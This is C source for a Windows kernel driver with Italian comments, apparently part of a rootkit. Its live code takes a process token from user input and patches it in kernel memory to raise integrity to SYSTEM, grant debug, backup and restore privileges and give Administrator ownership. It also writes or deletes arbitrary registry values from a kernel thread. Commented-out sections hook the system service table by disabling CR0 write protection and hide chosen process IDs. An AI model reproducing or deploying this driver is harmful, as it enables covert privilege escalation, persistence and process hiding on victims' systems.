#include "ntddk.h"
#include "driver.h"
#include "enumproc.h"
#include "main.h"

typedef unsigned int DWORD;
typedef unsigned char BYTE;
typedef DWORD (NTAPI *PsGetCurrentProcessId_t)(void);

//#define PREAMBLE_SIZE 10
#pragma pack(1)

	typedef struct registry_entry {
		DWORD is_deleting;
		WCHAR key_name[256];
		WCHAR value_name[50];
		WCHAR value[1024];
	} REE;
	
/*	typedef struct fixup_entry {
		PVOID func_addr;
		unsigned char func_preamble[PREAMBLE_SIZE];
	} fu_entry;

	typedef struct SDEntry {
		unsigned int *Base;
		unsigned int *dummy;
		unsigned int num;
		unsigned char *ptable;
	} SSDT_Entry;
	
	typedef struct UnHookEntry {
		unsigned int index;
		fu_entry fix_up;
	} UHE;
	
	typedef struct AddPidEntry {
		DWORD PID;
		DWORD is_add;
	} APE;*/
	
	typedef struct SidEntry {
		DWORD *SID;
		DWORD Attributes;
		DWORD dummy;
	} SIE;
	
/*	typedef struct HookedSDTEntry {
		PVOID orig_func;
		PVOID effective_func;
	} HSE;
	
	typedef struct Jumper_Params {
		HSE *global_func_array;
		DWORD *global_pid_array;
		DWORD sys_call_count;
		PsGetCurrentProcessId_t pPsGetCurrentProcessId;
	} JPE;*/
#pragma pack()

//#define HOOK_SIZE 128
//#define MAX_PID 1000
//#define MAGIC 0x30090000

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define SystemProcessesAndThreadsInformation 5 

DWORD g_semaphore;
WCHAR g_key_name[256];
WCHAR g_value_name[50];
WCHAR g_value[1024];
DWORD g_is_deleting;

//PVOID *g_mapped_sys_table = NULL;	// Puntatore alla sys call tables scrivibile
//JPE *jumper_entry = NULL;	// Struttura dati per l'hook
//char *jumper_hook_addr = NULL;	// Puntatore alla funzione hook

//__declspec(dllimport) SSDT_Entry KeServiceDescriptorTable;

/*NTSTATUS Jumper_Function()
{
	PVOID ret_address;		// EBP-0c
	JPE *pData;				// EBP-04
	DWORD curr_pid;			// NA
	DWORD i;				// NA
	DWORD sys_call_index;	// EBP-08
	
	__asm {
		MOV [sys_call_index], EAX
	 	PUSHA
		MOV EBX, 0x69696969
		MOV [pData], EBX
	}
	

	ret_address = pData->global_func_array[sys_call_index].effective_func;
	curr_pid = pData->pPsGetCurrentProcessId();
	for (i=0; i<MAX_PID; i++) 
		if (pData->global_pid_array[i] == curr_pid) {
			ret_address = pData->global_func_array[sys_call_index].orig_func;
			break;
		}
			
	__asm {
		POPA
		LEA ESP, [ret_address]
		//MOV EBP, [EBP]
		_emit 0x8B
		_emit 0x6D
		_emit 0x00
		RETN 0xC // XXX Attenzione se il compilatore sposta ret_address. Ora e' a EBP-0C
	}
	
	// not reached
	return 0;
}*/

void* MemCopy(void *destaddr, void const *srcaddr, size_t len) {
	char *dest = destaddr;
	char const *src = srcaddr;

	while (len-- > 0)
	*dest++ = *src++;
	return destaddr;
}


/*void FreePIDList(DWORD *PID)
{
	ULONG cbBuffer = 0x8000;
	VOID *pBuffer = NULL; 
	NTSTATUS Status;
	DWORD i=0;
	PSYSTEM_PROCESS_INFORMATION pInfo;
	DWORD pid_found;
	
	do {
		pBuffer = ExAllocatePoolWithTag (NonPagedPool, cbBuffer, 'agan'); 
		if (pBuffer == NULL) 
			return;

		Status = ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, pBuffer, cbBuffer, NULL);
		if (Status == STATUS_INFO_LENGTH_MISMATCH) {
			ExFreePoolWithTag(pBuffer, 'agan'); 
			cbBuffer *= 2; 
		} else if (!NT_SUCCESS(Status)) {
			ExFreePoolWithTag(pBuffer, 'agan'); 
			return; 
		}
	} while (Status == STATUS_INFO_LENGTH_MISMATCH);

	// Cicla la lista dei PID e cancella quelli che non sono più attivi
	for (i=0; i<MAX_PID; i++) {
		if (PID[i] == 0)
			continue;
			
		pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
		pid_found = 0;
		
		for (;;) {
			if (pInfo->ProcessId == PID[i]) {
				pid_found = 1;
				break;
			}
			
			if (pInfo->NextEntryDelta == 0)
				break; 
				
			pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo)+ pInfo->NextEntryDelta); 
		}
		
		if (!pid_found)
			PID[i] = 0;
	}
	ExFreePoolWithTag(pBuffer, 'agan');
	return;
}

DWORD fix_preamble(unsigned char *func_addr, unsigned char *func_preamble)
{
	PMDL func_mdl;
	unsigned char *safe_func_addr;
	DWORD i;
	
	if (func_preamble[0] == 0)
		return 1;
	
	if ( !(func_mdl = IoAllocateMdl(func_addr, PREAMBLE_SIZE, FALSE, TRUE, NULL)) )
		return  0;
	try {
		MmProbeAndLockPages(func_mdl, KernelMode, IoWriteAccess);
	} except(EXCEPTION_EXECUTE_HANDLER) {
		IoFreeMdl(func_mdl);
		return  0;
	}
	if ( !(safe_func_addr = MmGetSystemAddressForMdlSafe(func_mdl, HighPagePriority)) ) {
		MmUnlockPages(func_mdl);
		IoFreeMdl(func_mdl);
		return  0;
	}
	
	for (i=0; i<PREAMBLE_SIZE; i++)
		safe_func_addr[i] = func_preamble[i];
		
	MmUnlockPages(func_mdl);
	IoFreeMdl(func_mdl);
	return  1;
}*/

NTSTATUS do_ioctl_unhook(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
{
/*	UHE		*unhook_struct;
	PMDL 	pmdl_sys_call;
	PVOID 	*temp_g_mapped_sys_table;
	PVOID 	temp_func_ptr;
	DWORD	CR0Backup;

	if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(UHE) ) {
		unhook_struct = (UHE *)Irp->AssociatedIrp.SystemBuffer;

		// mappa la sdt se non l'ha ancora fatto
		if (!g_mapped_sys_table) {
			do {
				if ( !(pmdl_sys_call = IoAllocateMdl(KeServiceDescriptorTable.Base, KeServiceDescriptorTable.num*4, FALSE, TRUE, NULL)) )
					break;

				MmBuildMdlForNonPagedPool(pmdl_sys_call);
				// Cambia i flags della mappatura
				pmdl_sys_call->MdlFlags = pmdl_sys_call->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

				__try {
					MmProbeAndLockPages(pmdl_sys_call, KernelMode, IoWriteAccess|IoReadAccess); 
				} __except(EXCEPTION_EXECUTE_HANDLER) {
					break;
				}

				g_mapped_sys_table = MmGetMdlVirtualAddress(pmdl_sys_call);		
			} while(0);
		}

		// Check che la procedura di hooking si andata tutta a buon fine
		// e Controlla che la sys call sia fra quelle mappate
		// e Che ci sia bisogna di de-wrapparla
		if (g_mapped_sys_table && jumper_hook_addr && (unhook_struct->index < jumper_entry->sys_call_count) &&
			g_mapped_sys_table[unhook_struct->index] != unhook_struct->fix_up.func_addr) {
				// Per evitare la concorrenza sulla chiamata
				temp_func_ptr = g_mapped_sys_table[unhook_struct->index];

				if (temp_func_ptr != jumper_hook_addr) {
					// Valorizza la entry nella lista delle funzioni del jumper
					jumper_entry->global_func_array[unhook_struct->index].orig_func = unhook_struct->fix_up.func_addr;
					jumper_entry->global_func_array[unhook_struct->index].effective_func = temp_func_ptr;
				}

				// Hook alla SDT
				__asm {
					mov eax, cr0
					mov ecx, 0xFFFE0000
					mov CR0Backup, eax
					or  ecx, 0x0000FFFF
					and eax, ecx
					xor ecx, ecx
					mov cr0, eax
				}
				g_mapped_sys_table[unhook_struct->index] = jumper_hook_addr;
				__asm {
					mov eax, CR0Backup
					xor ecx, ecx
					or  eax, 0
					mov cr0, eax
				}
		}
		// In ogni caso ricopia il preambolo della funzione per evitare l'inline hookig
		fix_preamble(unhook_struct->fix_up.func_addr, unhook_struct->fix_up.func_preamble);
	}*/
	return STATUS_UNSUCCESSFUL;
}

BOOLEAN CheckSIEPointer(SIE *sid_array)
{
	try {
		if (sid_array[0].SID[0]==0x00000101)
			return TRUE;
	} except(EXCEPTION_EXECUTE_HANDLER) {
		return FALSE;
	}
	return TRUE;
}

NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
{
	DWORD i, j;

	// Controlla il codice e la grandezza del buffer di input
	if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(BYTE *) ) {
		DWORD sid_count;
		DWORD *privilege;
		SIE *sid_array;
		BYTE *token;

		token = *((BYTE **)Irp->AssociatedIrp.SystemBuffer);

		// questi sono offset solo per VISTA e Windows7
		sid_count = *((DWORD *)(token + 0x78));
		sid_array = *((SIE **)(token + 0x90));
		privilege = (DWORD *)(token + 0x40);
		if (!CheckSIEPointer(sid_array)) {
			// Offser per Windows8
			sid_count = *((DWORD *)(token + 0xE8));
			sid_array = *((SIE **)(token + 0xF0));
			if (!CheckSIEPointer(sid_array))
				return STATUS_SUCCESS;
		}

		// Cicla la lista dei SID associati al token effettivo
		for (i=0; i<sid_count; i++) {
			// Cerca l'integrity SID con privilegi medi.  Altrimenti non fa nulla.
			if (sid_array[i].SID[0]==0x00000101 && sid_array[i].SID[1]==0x10000000 && sid_array[i].SID[2]>=0x00002000 && sid_array[i].SID[2]<0x00003000) {
			
				// Eleva l'integrity level a SYSTEM
				sid_array[i].SID[2] = 0x00004000;

				// Setta SeDebugPrivilege | SeBackupPrivilege | SeRestorePrivilege
				// backup e restore servono per montare gli hive del reg
				*privilege |= 0x00160000;	// privilegi che hai
				privilege += 2;
				*privilege |= 0x00160000;	// privilegi abilitati

				// Ownership al gruppo Administrator
				for (j = 0; j < sid_count; j++)
					if (sid_array[j].Attributes & 0x00000010) 
						sid_array[j].Attributes = 0x0000000F;

				break;
			}
		}
	}

	return STATUS_SUCCESS;
}


NTSTATUS do_ioctl_addpid(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
{
/*	APE	*addpid_struct;
	DWORD i;

	if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(APE) ) {
		addpid_struct = (APE *)Irp->AssociatedIrp.SystemBuffer;

		if (jumper_entry && jumper_entry->global_pid_array) {
			// Aggiunge un PID all'hiding
			if (addpid_struct->is_add) {
				for (i = 0; i < MAX_PID; i++) {
					if (jumper_entry->global_pid_array[i] == 0) {
						jumper_entry->global_pid_array[i] = addpid_struct->PID;
						break;
					}
				}
				// Se non ha trovato spazio...
				if (i == MAX_PID) {
					FreePIDList(jumper_entry->global_pid_array);
					for (i = 0; i < MAX_PID; i++) {
						if (jumper_entry->global_pid_array[i] == 0) {
							jumper_entry->global_pid_array[i] = addpid_struct->PID;
							break;
						}
					}
				}
			} else {
				for (i = 0; i < MAX_PID; i++) {
					if (jumper_entry->global_pid_array[i] == addpid_struct->PID) {
						jumper_entry->global_pid_array[i] = 0;
						break;
					}
				}
			}
		}
	}*/
	return STATUS_SUCCESS;
}


NTSTATUS do_ioctl_reg(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
{
	REE	*registry_struct;

	if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(REE) ) {
		registry_struct = (REE *)Irp->AssociatedIrp.SystemBuffer;

		g_is_deleting = registry_struct->is_deleting;
		MemCopy(g_key_name, registry_struct->key_name, sizeof(g_key_name));
		MemCopy(g_value_name, registry_struct->value_name, sizeof(g_value_name));
		MemCopy(g_value, registry_struct->value, sizeof(g_value));

		g_semaphore = 1;
	}

	return STATUS_SUCCESS;
}


void WorkerThread (IN DWORD *semaphore)
{
	LARGE_INTEGER interval;
	interval.HighPart = -1;
	interval.LowPart = -1000000;
	
	for(;;) {
		KeDelayExecutionThread(UserMode, FALSE, &interval);

		if (*semaphore == 1) {
			if (g_is_deleting) 
				RtlDeleteRegistryValue(RTL_REGISTRY_ABSOLUTE, g_key_name, g_value_name);
			else 
				RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, g_key_name, g_value_name, REG_EXPAND_SZ, 
										g_value, (wcslen(g_value)+1)*sizeof(WCHAR));
			*semaphore = 0;
		}
	}
}

NTSTATUS DriverEntryHiding( IN PDRIVER_OBJECT dobj, IN PUNICODE_STRING regpath)
{
	UNICODE_STRING	dev_name_unicode;
	UNICODE_STRING	dev_link_unicode;
	NTSTATUS nt_status;
	HANDLE WorkerThreadHandle;
	DWORD i;
	
	/*DTRACE("DriverEntryHiding");
		
	do {
		// Alloca la struttura dati per l'hook
		if ( !(jumper_entry = (JPE *)ExAllocatePoolWithTag(NonPagedPool, sizeof(JPE), 'agam')) )
			break;
				
		// Salva il numero di sys_call mappate
		jumper_entry->sys_call_count = KeServiceDescriptorTable.num;
	
		// Inizializza l'array delle funzioni				
		if ( !(jumper_entry->global_func_array = (HSE *)ExAllocatePoolWithTag(NonPagedPool, jumper_entry->sys_call_count * sizeof(HSE), 'agak')) )
			break;
			
		for(i=0; i<jumper_entry->sys_call_count; i++) {
			jumper_entry->global_func_array[i].effective_func = NULL;
			jumper_entry->global_func_array[i].orig_func = NULL;
		}

		// Inizializza l'array dei PID	
		if ( !(jumper_entry->global_pid_array = (DWORD *)ExAllocatePoolWithTag(NonPagedPool,  MAX_PID * sizeof(DWORD), 'agal')) )
			break;
			
		for (i=0; i<MAX_PID; i++)
			jumper_entry->global_pid_array[i] = 0;
			
		// Funzioni richiamate (solo per paranoia)
		jumper_entry->pPsGetCurrentProcessId = (PsGetCurrentProcessId_t)PsGetCurrentProcessId;
		
		// Copia l'hook nello heap
		if ( !(jumper_hook_addr = (char *)ExAllocatePoolWithTag(NonPagedPool, HOOK_SIZE, 'MDrv')) )
			break;
			
		for (i=0; i<HOOK_SIZE; i++)
			jumper_hook_addr[i] = ((char *)Jumper_Function)[i];	
			
		// Binary patch per l'indirizzo della struttura dati
		for (i=0; jumper_hook_addr[i]!=0x69; i++);
		
		*((DWORD *)(jumper_hook_addr + i)) = (DWORD)jumper_entry;		
	} while(0);*/

	// Thread per le scritture nel registry
	g_semaphore = 0;
	PsCreateSystemThread(&WorkerThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, WorkerThread, &g_semaphore);

	return STATUS_SUCCESS;
}



void OnUnloadHiding(IN PDRIVER_OBJECT dobj)
{
	DWORD i;

	DTRACE("OnUnloadHiding");

	/*// Ripristina la SDT
	for (i=0; i<jumper_entry->sys_call_count; i++)
		if (jumper_entry->global_func_array[i].effective_func)
			g_mapped_sys_table[i] = jumper_entry->global_func_array[i].effective_func;*/
}